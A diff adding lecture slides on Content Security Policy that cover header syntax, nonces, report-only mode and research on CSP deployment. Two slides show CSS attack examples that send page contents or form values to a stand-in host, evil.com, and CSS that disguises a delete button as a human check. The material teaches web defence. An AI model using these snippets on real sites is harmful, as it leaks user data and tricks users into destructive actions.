@@ -1,0 +1,142 @@
+
+### Content Security Policy  {.smaller}
+
+
+* <code>Content-Security-Policy</code>: HTTP header sent to browsers
+* \\fbox{[]{.my-small} <code></code> Content-Security-Policy: default-src 'self' 'unsafe-inline'}
+* says ‘‘only load things from <em>same host</em> or <em>embedded in webpage</em>’’ 
+
+   * loading image from <code>evil.com</code> will fail
+
+* \\fbox{\\parbox{11cm[]{.my-small} <code></code> Content-Security-Policy: script-src 'none';<br>object-src 'none'; style-src 'self'}}  
+
+   * disallow all scripts, all plugins/etc.
+   * only allow stylesheets from same host (and not inline)
+
+
+
+### Aside: why care about stylesheets? (1) 
+
+
+* historical: IE 7 supported CSS expressions that can construct URLs from webpage data
+* getting web page contents:  
+```
+<link rel=stylesheet href="http://evil.com/?webpage contents here...
+
+```
+
+* also can do things with stylesheets
+
+
+### Aside: why care about stylesheets? (2)  {.smaller}
+
+
+
+* conditional image loaded to get data? assuming pre-filled-in-form:
+ 
+```
+input[value^=Virginia] {background: url(http://evil.com?Virginia)}
+
+```
+ 
+
+* adjust webpage display in lots of ways
+ 
+```
+.delete-form::before {content: "Please verify that you are human: ";}
+button.cancel { display: none };
+button.delete { font-size: 0pt; }
+button.delete::before { content: "I am Human!"; font-size: 16pt; }
+
+```
+
+
+### Content Security Policy examples (1)  {.smaller}
+
+
+* \\fbox{\\parbox{11cm<code></code> []{.my-small} Content-Security-Policy: script-src 'self' www.google-analytics.com; object-src 'none'}} 
+
+   * allow scripts from same host or <code>www.google-analytics.com</code>
+   * <em>disallow inline scripts</em>
+   * disallow plugins
+
+* \\fbox{\\parbox{11cm<code></code> []{.my-small} Content-Security-Policy: default-src 'none'; img-src 'self' https://…; …}}  
+
+   * allow nothing to start; then whitelist what is needed
+   * recommended strategy
+
+
+
+### CSP nonces  {.smaller}
+
+
+```html
+Content-Security-Policy: script-src https://foo.com
+                                    'nonce-DZJeVASMVs'
+
+...
+<script nonce="DZJeVASMVs">
+// legitimate embedded script
+document...
+</script>
+
+```
+ 
+
+* nonce: ‘‘<em>n</em>umber used only <em>once</em>’’
+* idea: <em>changes every time</em>; attacker can't guess for XSS attack 
+
+   * browser doesn't enforce that it changes; server's job
+
+
+
+### CSP report-only 
+
+
+* content-security-policy-report-only 
+
+   * don't block anything, but tell server if violation
+
+* can use to check before setting binding policy
+* can scan reports for possible issues without breaking webpage
+
+
+### CSP feature expansion  {.smaller}
+
+
+* originally: CSP was anti-XSS measure 
+
+   * meant as ‘defense in depth’ --- in case normal filtering fails
+
+* now also has directives to control 
+
+   * embedding webpages without permission (e.g. ‘clickjacking’ attacks)
+   * TLS usage
+
+
+
+### CSP deployment (2020 paper) 
+
+
+![](/web/roth-ndss-title){}
+
+
+### CSP deployment (2014-2019) 
+
+
+![](/web/roth-ndss-fig5){}
+
+
+### CSP implementation bugs (1) 
+
+
+![](/web/franken-title){}
+
+
+### CSP implementation bugs (2)  {.smaller}
+
+
+![](/web/franken-fig3){}
+ 
+![](/web/franken-fig10){}
+
